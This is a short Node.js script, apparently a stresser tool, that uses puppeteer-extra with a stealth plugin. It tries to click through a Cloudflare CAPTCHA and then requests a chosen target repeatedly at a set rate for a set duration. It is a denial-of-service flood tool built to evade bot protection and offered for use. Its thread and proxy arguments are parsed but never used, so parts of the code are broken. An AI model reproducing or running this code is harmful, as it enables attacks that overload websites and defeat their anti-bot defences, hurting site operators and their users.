const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');

puppeteer.use(StealthPlugin());

const target = process.argv[2];
const time = parseInt(process.argv[3]);
const ratelimit = parseInt(process.argv[4]);
const thread = parseInt(process.argv[5]);
const proxyFile = process.argv[6];

if (!target || !time || !ratelimit || !thread || !proxyFile) {
    console.log('Usage: node captcha.js target time ratelimit thread proxy');
    process.exit(1);
}

(async () => {
    const browser = await puppeteer.launch({ headless: false });
    const page = await browser.newPage();

    // Set user agent
    await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3');

    // Bypass Cloudflare CAPTCHA
    await page.goto(target, { waitUntil: 'networkidle0' });

    // Wait for the CAPTCHA box to appear
    await page.waitForSelector('#cf-captcha-container', { visible: true });

    // Click the CAPTCHA challenge button
    await page.click('#challenge-form [type="submit"]');

    // Wait for navigation after CAPTCHA click
    await page.waitForNavigation();

    // Continue with RPS requests
    const interval = 1000 / ratelimit;
    let counter = 0;
    const sendRequest = async () => {
        if (counter >= time * ratelimit) {
            clearInterval(intervalId);
            await browser.close();
        } else {
            await page.goto(target, { waitUntil: 'networkidle0', timeout: 0, referer: 'https://www.google.com/' });
            console.log(`Sent request ${counter + 1}`);
            counter++;
        }
    };
    const intervalId = setInterval(sendRequest, interval);
})();
